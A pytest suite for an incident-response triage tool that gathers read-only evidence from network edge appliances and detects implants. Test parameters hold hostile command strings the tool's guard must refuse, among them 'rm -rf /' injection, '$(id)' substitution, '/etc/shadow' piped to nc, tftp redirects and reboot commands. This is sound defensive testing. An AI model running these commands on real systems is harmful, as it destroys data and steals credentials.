"""End-to-end and unit tests for edgetriage.

Run from the repository root:  python -m pytest -q tests/
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tests"))

import make_fixtures  # noqa: E402
from edgetriage.analyze import analyze  # noqa: E402
from edgetriage.collect import CollectionRefused, collect, plan  # noqa: E402
from edgetriage.custody import Case  # noqa: E402
from edgetriage.profiles import TIER_ORDER, ProfileError, available_profiles, get_profile, load_profile  # noqa: E402
from edgetriage.report_extras import build_brief, build_timeline  # noqa: E402
from edgetriage.transport import ReplayTransport  # noqa: E402
from edgetriage.util import sha256_file  # noqa: E402


@pytest.fixture(scope="session")
def fx(tmp_path_factory) -> Path:
    out = tmp_path_factory.mktemp("fixtures")
    make_fixtures.main(out)
    return out


def run(fx: Path, tmp: Path, profile: str, fixture: str, case_id: str = "IR-TEST", **kw) -> Path:
    prof = get_profile(profile)
    case = Case(tmp / case_id)
    collect(prof, ReplayTransport(fx / fixture), case, case_id=case_id, operator="tester",
            target={"host": "192.0.2.10"}, preflight=kw.pop("preflight", {"rebooted_since_incident": "no"}),
            variables=kw.pop("variables", {}), **kw)
    return case.root


def det(findings: dict, did: str) -> dict:
    return next(r for r in findings["detections"] if r["id"] == did)


# ------------------------------------------------------------------ profiles
def test_all_profiles_load():
    names = set(available_profiles())
    assert {"panos", "fortios", "netscaler", "cisco-asa", "ivanti-ics"} <= names
    for n in names:
        get_profile(n)


def test_guard_rejects_state_changing_command(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text(
        "profile: bad\nplatform_id: EDGE-0001\ndisplay: bad\n"
        "cli: {allow: ['show [\\w ]+', 'request [\\w ]+'], deny: ['^request ']}\n"
        "steps:\n  - {id: x, tier: V0, kind: command, cmd: 'request restart system', purpose: p}\n"
    )
    with pytest.raises(ProfileError, match="deny"):
        load_profile(p)


def test_guard_rejects_non_session_setup(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text(
        "profile: bad\nplatform_id: EDGE-0002\ndisplay: bad\n"
        "cli: {allow: ['get [\\w ]+'], session_setup: ['config system console']}\n"
        "steps:\n  - {id: x, tier: V0, kind: command, cmd: 'get system status', purpose: p}\n"
    )
    with pytest.raises(ProfileError, match="session"):
        load_profile(p)


def test_low_confidence_step_must_be_marked_unverified(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text(
        "profile: bad\nplatform_id: EDGE-0002\ndisplay: bad\ncli: {allow: ['get [\\w ]+']}\n"
        "steps:\n  - {id: x, tier: V0, kind: command, cmd: 'get system status', purpose: p, confidence: low}\n"
    )
    with pytest.raises(ProfileError, match="unverified"):
        load_profile(p)


@pytest.mark.parametrize("name", ["panos", "fortios", "netscaler", "cisco-asa", "ivanti-ics"])
def test_plan_follows_order_of_volatility(name):
    steps = [s for s, _ in plan(get_profile(name), True, True, {})]
    idx = [TIER_ORDER.index(s.tier) for s in steps]
    assert idx == sorted(idx)
    impacts = [s.impact for s in steps]
    if "break-glass" in impacts:
        assert impacts[-1] == "break-glass"


def test_asa_memory_check_precedes_everything_disruptive():
    ids = [s.id for s, _ in plan(get_profile("cisco-asa"), True, True, {})]
    assert ids.index("mem_region_lina") < ids.index("show_running_config") < ids.index("core_dump")


def test_bundle_and_break_glass_are_opt_in():
    prof = get_profile("panos")
    default = {s.id for s in prof.ordered()}
    assert "tsf_export" not in default and "tac_root_artifacts" not in default
    assert "tsf_export" in {s.id for s in prof.ordered(allow_bundle=True)}


# ------------------------------------------------------------------ collection / custody
def test_var_cannot_smuggle_shell_syntax(fx, tmp_path):
    # Refused before anything is typed or a case is written.
    with pytest.raises(ProfileError):
        run(fx, tmp_path, "fortios", "fortios-compromised",
            variables={"sslvpn_lang_dir": "/data/lang/custom; rm -rf /"})
    assert not (tmp_path / "IR-TEST").exists()


def test_missing_var_skips_step(fx, tmp_path):
    root = run(fx, tmp_path, "fortios", "fortios-compromised")
    m = json.loads((root / "manifest.json").read_text())
    step = next(s for s in m["steps"] if s["step_id"] == "listing_sslvpn_lang")
    assert step["status"] == "skipped" and "sslvpn_lang_dir" in step["error"]


def test_break_glass_needs_confirmation(fx, tmp_path):
    with pytest.raises(CollectionRefused):
        run(fx, tmp_path, "cisco-asa", "asa-compromised", break_glass=True, confirm=lambda _m: False)


def test_existing_case_is_never_overwritten(fx, tmp_path):
    run(fx, tmp_path, "panos", "panos-benign")
    with pytest.raises(CollectionRefused):
        run(fx, tmp_path, "panos", "panos-benign")


def test_manifest_hashes_are_true(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-compromised")
    m = json.loads((root / "manifest.json").read_text())
    assert m["tool_sha256"] and m["profile_sha256"]
    for s in m["steps"]:
        if s["status"] == "ok" and s.get("output"):
            assert sha256_file(root / s["output"]) == s["sha256"]
    recorded = (root / "manifest.sha256").read_text().split()[0]
    assert recorded == sha256_file(root / "manifest.json")


def test_ingest_refuses_hostile_members_and_chains_manifest(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-benign")
    case = Case(root)
    before = sha256_file(case.manifest_path)
    m = case.load()
    rec = case.ingest(fx / "panos-tsf.tgz", "tsf", evidence_classes=["bundle", "filesystem"])
    m["ingested"].append(rec)
    case.save(m)
    assert rec["copy_verified"]
    assert any("unsafe path" in r for r in rec["extract_rejected"])
    assert any("link -> /" in r for r in rec["extract_rejected"])
    assert not (tmp_path / "escape.txt").exists() and not (root / "escape.txt").exists()
    assert case.load()["previous_manifest_sha256"] == before


# ------------------------------------------------------------------ analysis
def test_panos_compromised(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-compromised")
    f = analyze(root)
    assert f["verdict"]["level"] == "COMPROMISED"
    assert det(f, "panos-3400-gpsvc-non-guid-session")["hit_count"] == 2
    assert det(f, "panos-3400-gpsvc-injection-payload")["hit_count"] == 1
    assert det(f, "panos-3400-crond-download-exec")["status"] == "hit"
    assert det(f, "panos-3400-upstyle-pth")["status"] == "not-evaluated"


def test_panos_tsf_ingest_finds_upstyle_and_config(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-benign")
    case = Case(root)
    m = case.load()
    m["ingested"].append(case.ingest(fx / "panos-tsf.tgz", "tsf"))
    case.save(m)
    f = analyze(root)
    assert det(f, "panos-3400-upstyle-pth")["status"] == "hit"
    assert det(f, "panos-3400-upstyle-yara")["status"] == "hit"
    assert det(f, "panos-3400-config-in-webroot")["status"] == "hit"
    assert f["verdict"]["level"] == "COMPROMISED"


def test_benign_is_never_called_clean(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-benign")
    f = analyze(root)
    assert f["verdict"]["level"] == "NO-INDICATORS-FOUND"
    assert "not a finding that the device is clean" in f["verdict"]["rationale"]
    kinds = {g["kind"] for g in f["evidence_gaps"]}
    assert {"detection-not-evaluated", "standing"} <= kinds
    assert "CLEAN" not in (root / "report.md").read_text().upper().replace("NOT A FINDING THAT THE DEVICE IS CLEAN", "")


def test_rebooted_device_reports_volatile_loss(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-benign", preflight={"rebooted_since_incident": "yes"})
    f = analyze(root)
    assert any(g["kind"] == "volatile-lost" for g in f["evidence_gaps"])


def test_netscaler_compromised(fx, tmp_path):
    root = run(fx, tmp_path, "netscaler", "netscaler-compromised")
    f = analyze(root)
    assert f["verdict"]["level"] == "COMPROMISED"
    assert "corroborated" in f["verdict"]["rationale"]
    assert det(f, "netscaler-php-writable")["hit_count"] == 1
    assert det(f, "netscaler-php-webshell-content")["hit_count"] == 1
    assert det(f, "netscaler-cron-download")["status"] == "hit"
    assert det(f, "netscaler-suid-in-tmp")["status"] == "hit"
    assert det(f, "netscaler-shell-listener")["status"] == "hit"
    nb = det(f, "netscaler-auth-nonprintable")
    assert nb["hit_count"] == 1 and "\\x00" in nb["hits"][0]["excerpt"]


def test_netscaler_benign(fx, tmp_path):
    root = run(fx, tmp_path, "netscaler", "netscaler-benign")
    f = analyze(root)
    assert f["verdict"]["level"] == "NO-INDICATORS-FOUND"
    assert det(f, "netscaler-php-webshell-content")["status"] == "no-hit"


def test_asa_line_dancer_regions(fx, tmp_path):
    root = run(fx, tmp_path, "cisco-asa", "asa-compromised")
    f = analyze(root)
    r = det(f, "asa-lina-multiple-exec-regions")
    assert r["status"] == "hit" and "0x1000" in r["hits"][0]["detail"]
    assert det(f, "asa-line-runner-zip")["status"] == "hit"
    assert det(f, "asa-zip-on-disk0")["status"] == "no-hit"   # the named bundle is excluded
    assert f["verdict"]["level"] == "COMPROMISED"            # memory + persistence corroborate


def test_single_likely_class_stays_likely(fx, tmp_path):
    root = run(fx, tmp_path, "fortios", "fortios-compromised",
               variables={"sslvpn_lang_dir": "/data/lang/custom"})
    f = analyze(root)
    assert f["verdict"]["level"] == "LIKELY-COMPROMISED"     # symlink only (persistence)


def test_asa_benign(fx, tmp_path):
    root = run(fx, tmp_path, "cisco-asa", "asa-benign")
    f = analyze(root)
    assert det(f, "asa-lina-multiple-exec-regions")["status"] == "no-hit"
    assert f["verdict"]["level"] == "NO-INDICATORS-FOUND"


def test_fortios_baseline_is_required_and_used(fx, tmp_path):
    root = run(fx, tmp_path, "fortios", "fortios-compromised",
               variables={"sslvpn_lang_dir": "/data/lang/custom"})
    f = analyze(root)
    assert det(f, "fortios-fs-hash-baseline")["status"] == "not-evaluated"
    assert det(f, "fortios-symlink-root")["status"] == "hit"
    assert det(f, "fortios-sslvpnd-crash")["status"] == "hit"
    baseline = json.loads((fx / "fortios-baseline.json").read_text())
    f = analyze(root, baseline=baseline)
    r = det(f, "fortios-fs-hash-baseline")
    assert r["hit_count"] == 1 and r["hits"][0]["tier"] == "likely"
    assert "/bin/sslvpnd" in r["hits"][0]["detail"]


def test_ivanti_profile_is_all_manual(fx, tmp_path):
    (tmp_path / "empty" / "commands").mkdir(parents=True)
    prof = get_profile("ivanti-ics")
    case = Case(tmp_path / "IV-1")
    m = collect(prof, ReplayTransport(tmp_path / "empty"), case, case_id="IV-1", operator="t",
                target={"host": "192.0.2.30"}, preflight={}, variables={})
    assert {s["status"] for s in m["steps"]} == {"pending-manual"}
    f = analyze(case.root)
    assert sum(g["kind"] == "manual-step-pending" for g in f["evidence_gaps"]) == len(m["steps"])


# ------------------------------------------------------------------ outputs
def test_timeline_and_brief(fx, tmp_path):
    root = run(fx, tmp_path, "panos", "panos-compromised")
    analyze(root)
    rows = build_timeline(root)
    assert any(r["kind"].startswith("finding:") for r in rows)
    assert [r["ts"] for r in rows] == sorted(r["ts"] for r in rows)
    brief = build_brief(root).read_text()
    assert "Do not raise or lower it" in brief and '"rid": "R001"' in brief
    assert (root / "brief_records.jsonl").stat().st_size > 0


def test_yara_webshell_rule(fx):
    yara = pytest.importorskip("yara")
    rules = yara.compile(filepath=str(ROOT / "04-citrix-netscaler" / "php_webshell_generic.yar"))
    assert rules.match(str(fx / "shell.php"))
    assert not rules.match(str(fx / "benign.php"))


# ------------------------------------------------------------------ SSH transport (no network)
class FakeChannel:
    """Scripted PTY: replies to each sent command with canned chunks."""

    def __init__(self, script):
        self.script, self.pending, self.sent = script, [], []

    def send(self, data):
        self.sent.append(data)
        self.pending.extend(self.script.get(data, []))

    def recv_ready(self):
        return bool(self.pending)

    def recv(self, _n):
        return self.pending.pop(0).encode()


def test_ssh_transport_handles_pager_echo_and_ansi():
    from edgetriage.transport import SSHTransport
    t = SSHTransport("192.0.2.10", "ir-ro", prompt=r"fw-lab-01> ?$", pager="--More--")
    t.chan = FakeChannel({
        "show system info\n": ["show system info\r\n", "\x1b[0mhostname: fw-lab-01\r\n--More--"],
        " ": ["sw-version: 10.2.9\r\nfw-lab-01> "],
    })
    out = t.run("show system info", timeout=5)
    assert out == "hostname: fw-lab-01\nsw-version: 10.2.9\n"
    assert t.chan.sent == ["show system info\n", " "]


# ------------------------------------------------------------------ guard regressions (independent review, 2026-10-22)
@pytest.mark.parametrize("profile,cmd", [
    ("panos", "show clock\nrequest restart system"),
    ("panos", "show clock\rrequest restart system"),
    ("fortios", "get system status\nexecute reboot"),
    ("netscaler", "show ns version\nshell rm -rf /var/log"),
    ("netscaler", "shell find /var/tmp\nreboot -warm"),
    ("netscaler", "shell find /var/tmp -de''lete"),
    ("netscaler", "shell find /var/tmp -ex'e'c rm -f {} +"),
    ("netscaler", "shell find /var/tmp -de\\lete"),
    ("netscaler", "shell find /var/tmp -fprint0 /var/x"),
    ("netscaler", "show techsupport"),
    ("cisco-asa", "show clock | redirect disk0:/x"),
    ("cisco-asa", "show clock\nreload noconfirm"),
])
def test_guard_refuses_smuggled_commands(profile, cmd):
    with pytest.raises(ProfileError):
        get_profile(profile).check_command(cmd)


def test_multiline_cmd_in_profile_is_refused(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text("profile: bad\nplatform_id: EDGE-0001\ndisplay: bad\ncli: {allow: ['show [\\w -]+']}\n"
                 "steps:\n  - id: x\n    tier: V0\n    kind: command\n    purpose: p\n    cmd: |\n      show clock\n      write erase\n")
    with pytest.raises(ProfileError, match="control character"):
        load_profile(p)


def test_session_setup_newline_is_refused(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text("profile: bad\nplatform_id: EDGE-0005\ndisplay: bad\n"
                 "cli: {allow: ['show [\\w -]+'], session_setup: [\"terminal pager 0\\nreload noconfirm\"]}\n"
                 "steps:\n  - {id: x, tier: V0, kind: command, cmd: 'show clock', purpose: p}\n")
    with pytest.raises(ProfileError):
        load_profile(p)


@pytest.mark.parametrize("value", ["u@h:/x\nrequest restart system", "/data;reboot", "/data$(id)", "/data/ x"])
def test_var_values_are_constrained_for_every_impact(fx, tmp_path, value):
    with pytest.raises(ProfileError):
        run(fx, tmp_path, "panos", "panos-benign", variables={"bundle_dest": value}, allow_bundle=True)


def test_shipped_commands_still_pass():
    for name in available_profiles():
        prof = get_profile(name)
        for s in prof.steps:
            if s.impact == "none":
                for c in (s.cmd, s.list_cmd):
                    if c:
                        prof.check_command(c.format(**{v: s.var_examples.get(v, "/data/lang/custom")
                                                       for v in s.requires_vars}))


def test_forged_listing_lines_are_not_fetched(fx, tmp_path):
    import shutil
    rp = tmp_path / "replay"
    shutil.copytree(fx / "netscaler-compromised", rp)
    from edgetriage.util import slugify
    listing = rp / "commands" / (slugify("shell find /var/netscaler/logon /var/vpn /netscaler/ns_gui /var/netscaler/ns_gui -type f -name '*.php'") + ".txt")
    listing.write_text(listing.read_text() + "/dev/zero\n/var/netscaler/logon/a b.php\n")
    root = run(fx, tmp_path, "netscaler", "netscaler-compromised")  # warm-up with clean fixture
    m = json.loads((root / "manifest.json").read_text())
    case = Case(tmp_path / "IR-FORGED")
    collect(get_profile("netscaler"), ReplayTransport(rp), case, case_id="IR-FORGED", operator="t",
            target={"host": "192.0.2.20"}, preflight={}, variables={})
    m = case.load()
    step = next(s for s in m["steps"] if s["step_id"] == "fetch_php")
    refused = {f["remote"] for f in step["files"] if f.get("error", "").startswith("refused")}
    assert "/dev/zero" in refused and "/var/netscaler/logon/a b.php" in refused


def test_prompt_lookalike_inside_output_does_not_end_capture():
    from edgetriage.transport import SSHTransport
    t = SSHTransport("192.0.2.10", "ir-ro", prompt=r"fw-lab-01> ?$", pager="--More--")
    t.QUIET = 0.05
    t.chan = FakeChannel({
        "tail lines 5 mp-log gpsvc.log\n": [
            "tail lines 5 mp-log gpsvc.log\r\n",
            "line one says fw-lab-01> but is data\r\nline two mentions --More-- mid-line\r\n",
            "line three\r\nfw-lab-01> "],
    })
    out = t.run("tail lines 5 mp-log gpsvc.log", timeout=5)
    assert "line three" in out and "--More-- mid-line" in out and t.chan.sent == ["tail lines 5 mp-log gpsvc.log\n"]


def test_ingest_label_and_duplicate_members(fx, tmp_path):
    import io
    import tarfile
    root = run(fx, tmp_path, "panos", "panos-benign")
    case = Case(root)
    with pytest.raises(ValueError):
        case.ingest(fx / "panos-tsf.tgz", "../..")
    tgz = tmp_path / "dupes.tgz"
    with tarfile.open(tgz, "w:gz") as tf:
        for name, data in [("a/x.log", b"first"), ("a/x.log", b"second"), ("a/x.log/y", b"clash"), ("C:evil", b"d")]:
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    rec = case.ingest(tgz, "dupes")
    assert (root / rec["extracted_to"] / "a" / "x.log").read_bytes() == b"first"
    joined = " | ".join(rec["extract_rejected"])
    assert "duplicate" in joined and "clashes" in joined and "C:evil" in joined


# ------------------------------------------------------------------ claim-verification regressions (2026-10-22)
def test_asa_region_parser_matches_published_format():
    """Pin the real `show memory region` row from the Talos ArcaneDoor example.

    An earlier parser expected a 0x-prefixed length column that no ASA prints,
    so it matched nothing and reported 'no hit' on a compromised device. This
    test fails if the parser ever drifts away from the published format again.
    """
    from edgetriage.checks.cisco import _REGION
    published = "561d9fee9000-561d9feea000 r-xp 02696000 00:02 5955    /asa/bin/lina"
    m = _REGION.match(published)
    assert m is not None, "parser no longer matches the published ASA row format"
    assert m.group("perms") == "r-xp"
    assert int(m.group("end"), 16) - int(m.group("start"), 16) == 0x1000
    # The invented layout the old parser wanted must NOT be what we depend on.
    assert _REGION.match("0x000055d3e5c00000 0x000055d3e9a77000 0x0000000003e77000 r-xp 0 1234 /asa/bin/lina") is None


def test_line_runner_matches_variant_bundle_names():
    """The ASA loader accepts client_bundle*.zip, so the detection must too."""
    import re
    import yaml
    pack = yaml.safe_load((ROOT / "artifacts/packs/EDGE-PACK-0006-cisco-asa-arcanedoor.yml").read_text())
    pat = next(d["pattern"] for d in pack["detect"] if d["id"] == "asa-line-runner-zip")
    for name in ("client_bundle_install.zip", "client_bundle_x.zip", "client_bundle.zip"):
        assert re.search(pat, name, re.I), name


def test_every_implant_without_coverage_states_a_gap():
    """A coverage hole must be visible: no detections means a written gap."""
    import yaml
    for p in (ROOT / "artifacts/intel/implants").glob("*.yml"):
        doc = yaml.safe_load(p.read_text())
        assert doc.get("detections") or doc.get("gap"), p.name


# ------------------------------------------------------------------ new platforms (2026-10-22)
IOSXE_PKG = "bootflash:isr4400-mono-universalk9.17.09.04a.SPA.pkg"
NEW_PLATFORMS = [("junos", "junos", {}), ("cisco-iosxe", "iosxe", {"boot_image": IOSXE_PKG}),
                 ("f5-bigip", "f5", {}), ("checkpoint-gaia", "checkpoint", {})]


@pytest.mark.parametrize("profile,fixture,var", NEW_PLATFORMS)
def test_new_platform_benign_is_not_called_clean(fx, tmp_path, profile, fixture, var):
    root = run(fx, tmp_path, profile, f"{fixture}-benign", variables=var)
    f = analyze(root)
    assert f["verdict"]["level"] == "NO-INDICATORS-FOUND"
    assert not [r for r in f["detections"] if r["status"] == "hit"]


@pytest.mark.parametrize("profile,fixture,var,expected", [
    ("junos", "junos", {}, "COMPROMISED"),
    ("cisco-iosxe", "iosxe", {"boot_image": IOSXE_PKG}, "COMPROMISED"),
    ("f5-bigip", "f5", {}, "COMPROMISED"),
    ("checkpoint-gaia", "checkpoint", {}, "LIKELY-COMPROMISED"),
])
def test_new_platform_compromised_verdict(fx, tmp_path, profile, fixture, var, expected):
    root = run(fx, tmp_path, profile, f"{fixture}-compromised", variables=var)
    assert analyze(root)["verdict"]["level"] == expected


def test_junos_masquerade_matches_exact_names_only(fx, tmp_path):
    f = analyze(run(fx, tmp_path, "junos", "junos-compromised"))
    names = {h["excerpt"].split()[-1] for h in det(f, "junos-unc3886-masquerade-proc")["hits"]}
    assert names == {"appid", "to"}            # appidd and jddosd in the same listing must not match
    assert det(f, "junos-login-record-backups")["hit_count"] == 2
    assert det(f, "junos-unc3886-tinyshell-yara")["status"] == "not-evaluated"   # no binaries via CLI


def test_junos_listing_type_markers_do_not_hide_files(fx, tmp_path):
    """Junos `file list` appends * and | markers; a pattern anchored on the bare name saw nothing."""
    f = analyze(run(fx, tmp_path, "junos", "junos-compromised"))
    assert det(f, "junos-unc3886-payload-files")["hit_count"] == 2      # ldb.b64 and loader.bin*
    assert det(f, "junos-unc3886-null-fifo")["hit_count"] == 1          # null|
    assert det(f, "junos-syslog-conf-backup")["hit_count"] == 1
    assert det(f, "junos-hijacked-cat-process")["hit_count"] == 1


def test_junos_integrity_check_is_not_impact_free():
    """JMRT integrity-check writes a test file and syslog lines (Juniper), so it is opt-in."""
    p = get_profile("junos")
    step = next(s for s in p.steps if s.id == "jmrt_integrity_check")
    assert step.impact == "vendor-bundle"
    with pytest.raises(Exception):
        p.check_command("request system malware-scan integrity-check")


def test_iosxe_rwx_dirty_threshold_and_not_evaluated(fx, tmp_path):
    f = analyze(run(fx, tmp_path, "cisco-iosxe", "iosxe-compromised", variables={"boot_image": IOSXE_PKG}))
    r = det(f, "iosxe-iosd-rwx-dirty")
    assert r["hit_count"] == 1 and "12 kB" in r["hits"][0]["detail"]   # rw-p with dirty pages is normal, not a hit
    # An error instead of smaps must be 'not evaluated', never 'no hit'.
    import shutil
    from edgetriage.util import slugify
    rp = tmp_path / "err"
    shutil.copytree(fx / "iosxe-benign", rp)
    (rp / "commands" / (slugify("show platform software process memory rp active name iosd smaps") + ".txt")).write_text(
        "% Invalid input detected at '^' marker.\n")
    case = Case(tmp_path / "IR-ERR")
    collect(get_profile("cisco-iosxe"), ReplayTransport(rp), case, case_id="IR-ERR", operator="t",
            target={"host": "192.0.2.10"}, preflight={}, variables={"boot_image": IOSXE_PKG})
    assert det(analyze(case.root), "iosxe-iosd-rwx-dirty")["status"] == "not-evaluated"


def test_iosxe_switch_form_smaps_is_read(fx, tmp_path):
    """Catalyst switches need the `switch active rp active` form; the router form errors there."""
    import shutil
    from edgetriage.util import slugify
    rp = tmp_path / "sw"
    shutil.copytree(fx / "iosxe-compromised", rp)
    router = rp / "commands" / (slugify("show platform software process memory rp active name iosd smaps") + ".txt")
    switch = rp / "commands" / (slugify("show platform software process memory switch active rp active name iosd smaps") + ".txt")
    switch.write_text(router.read_text())
    router.write_text("% Invalid input detected at '^' marker.\n")
    case = Case(tmp_path / "IR-SW")
    collect(get_profile("cisco-iosxe"), ReplayTransport(rp), case, case_id="IR-SW", operator="t",
            target={"host": "192.0.2.10"}, preflight={}, variables={"boot_image": IOSXE_PKG})
    r = det(analyze(case.root), "iosxe-iosd-rwx-dirty")
    assert r["hit_count"] == 1 and r["hits"][0]["source"] == "step:iosd_smaps_switch"


def test_iosxe_packages_conf_readable_but_not_writable():
    p = get_profile("cisco-iosxe")
    p.check_command("more bootflash:packages.conf")
    for bad in ("more bootflash:x.conf | redirect tftp://192.0.2.1/x", "more bootflash:vlan.dat"):
        with pytest.raises(Exception):
            p.check_command(bad)


def test_asa_error_output_is_not_evaluated(fx, tmp_path):
    import shutil
    from edgetriage.util import slugify
    rp = tmp_path / "asaerr"
    shutil.copytree(fx / "asa-benign", rp)
    for c in ("show memory region | include lina", "show memory region"):
        (rp / "commands" / (slugify(c) + ".txt")).write_text("ERROR: % Invalid input detected at '^' marker.\n")
    case = Case(tmp_path / "IR-ASAERR")
    collect(get_profile("cisco-asa"), ReplayTransport(rp), case, case_id="IR-ASAERR", operator="t",
            target={"host": "192.0.2.10"}, preflight={}, variables={})
    assert det(analyze(case.root), "asa-lina-multiple-exec-regions")["status"] == "not-evaluated"


def test_iosxe_implant_check_response_confirms(fx, tmp_path):
    root = run(fx, tmp_path, "cisco-iosxe", "iosxe-benign", variables={"boot_image": IOSXE_PKG})
    case = Case(root)
    m = case.load()
    m["ingested"].append(case.ingest(fx / "iosxe-implant-check.txt", "implant-check"))
    case.save(m)
    f = analyze(root)
    assert det(f, "iosxe-implant-check-positive")["hits"][0]["tier"] == "confirmed"
    assert f["verdict"]["level"] == "COMPROMISED"


def test_f5_userinfo_burst_uses_vendor_threshold(fx, tmp_path):
    f = analyze(run(fx, tmp_path, "f5-bigip", "f5-compromised"))
    r = det(f, "f5-94127-userinfo-burst")
    hit = r["hits"][0]["extra"]
    assert r["hit_count"] == 1 and hit["total"] == 15 and hit["top_ip"] == "203.0.113.77"
    assert hit["addresses"] == 2 and not hit["single_source"]
    benign = analyze(run(fx, tmp_path, "f5-bigip", "f5-benign", case_id="IR-F5B"))
    assert det(benign, "f5-94127-userinfo-burst")["status"] == "no-hit"


def test_checkpoint_cert_subject_export_corroborates(fx, tmp_path):
    root = run(fx, tmp_path, "checkpoint-gaia", "checkpoint-compromised")
    case = Case(root)
    m = case.load()
    m["ingested"].append(case.ingest(fx / "cp-85102-export.csv", "cp-85102"))
    case.save(m)
    f = analyze(root)
    assert det(f, "cp-85102-attacker-cert-subject")["status"] == "hit"
    assert f["verdict"]["level"] == "COMPROMISED"     # likely auth-logs + likely web-logs corroborate


def test_new_bash_guards_refuse_smuggling():
    smuggled = {
        "f5-bigip": ["tmsh list apm session delete all | cat", "tmsh show sys version | cat\nreboot",
                     "ls -la /tmp | sh", "cat /etc/shadow | nc 192.0.2.9 9", "ls -la ${IFS}",
                     "find /usr -type f -name 'x' -delete", "tmsh run util bash | cat"],
        "checkpoint-gaia": ["fw ver; reboot", "ls -l /tmp | sh", "ls -1d $(id)", "clish -c 'set user x'"],
        "junos": ["show version | no-more | save /var/tmp/x", "request system malware-scan quick-scan",
                  "show version\nrequest system reboot", "file delete /var/log/messages"],
        "cisco-iosxe": ["show running-config | redirect bootflash:x", "show clock\nreload",
                        "verify /sha512 bootflash:x; reload", "guestshell run bash"],
    }
    for prof, cmds in smuggled.items():
        p = get_profile(prof)
        for c in cmds:
            with pytest.raises(ProfileError):
                p.check_command(c)



# ------------------------------------------------------------------ verification regressions, round 2 (2026-10-22)
def test_rotated_gzip_logs_are_read(fx, tmp_path):
    """Rotated appliance logs are gzip. Reading them as raw bytes found nothing."""
    import gzip
    root = run(fx, tmp_path, "netscaler", "netscaler-benign")
    leak = (b'Oct 13 06:05:01 <local0.info> 192.0.2.20 10/13/2026:06:05:01 GMT ns-gw 0-PPE-0 : default AAA '
            b'LOGIN_FAILED 102 0 :  User \x00\x07\xc3\x1fX\x02 - Client_ip 198.51.100.66 - Failure_reason ""\n')
    rot = root / "files" / "fetch_logs" / "var" / "log" / "ns.log.1.gz"
    rot.parent.mkdir(parents=True, exist_ok=True)
    rot.write_bytes(gzip.compress(leak))
    r = det(analyze(root), "netscaler-auth-nonprintable")
    assert r["hit_count"] == 1 and r["hits"][0]["source"].endswith("ns.log.1.gz")


def test_truncated_gzip_does_not_crash(tmp_path):
    import gzip
    from edgetriage.evidence import Source, iter_lines
    good = gzip.compress(b"line one\nline two\n" * 1000)
    bad = tmp_path / "x.log.gz"
    bad.write_bytes(good[: len(good) // 2])
    lines = list(iter_lines(Source("file", "/x.log.gz", bad)))
    assert lines and lines[0][1] == b"line one"


def test_f5_burst_spread_across_addresses_is_caught(fx, tmp_path):
    """F5's rule is per log, not per address: 12 failures from 12 sources must fire."""
    root = run(fx, tmp_path, "f5-bigip", "f5-benign")
    apm = root / "files" / "fetch_apm" / "var" / "log" / "apm"
    line = ("Oct 14 06:{m:02d}:00 bigip-lab err tmm1[30975]: 01990004:3: /Common/oauth_as: Request UserInfo from "
            "Source ID (null) IP 203.0.113.{i}%2 failed. Error Code (invalid_token) Error Description (The access token is invalid.)")
    apm.write_text("\n".join(line.format(m=i, i=i) for i in range(12)) + "\n")
    r = det(analyze(root), "f5-94127-userinfo-burst")
    assert r["hit_count"] == 1 and r["hits"][0]["extra"]["addresses"] == 12   # route-domain suffix parsed too


def test_cpinfo_never_uploads():
    cmd = next(s for s in get_profile("checkpoint-gaia").steps if s.id == "cpinfo_bundle").cmd
    assert " -D " in cmd and " -d " in cmd    # no upload to Check Point, no self-update


def test_f5_audit_patterns_use_the_real_format():
    import re
    import yaml
    line = "Oct 14 07:01:02 bigip notice icrd_child[1]: AUDIT - pid=1 user=admin folder=/Common module=(tmos)# status=[Command OK] cmd_data=run util bash -c id"
    pack = yaml.safe_load((ROOT / "artifacts/packs/EDGE-PACK-0017-f5-control-plane-historic.yml").read_text())
    pat = next(d["pattern"] for d in pack["detect"] if d["id"] == "f5-audit-util-bash-c")
    assert re.search(pat, line)
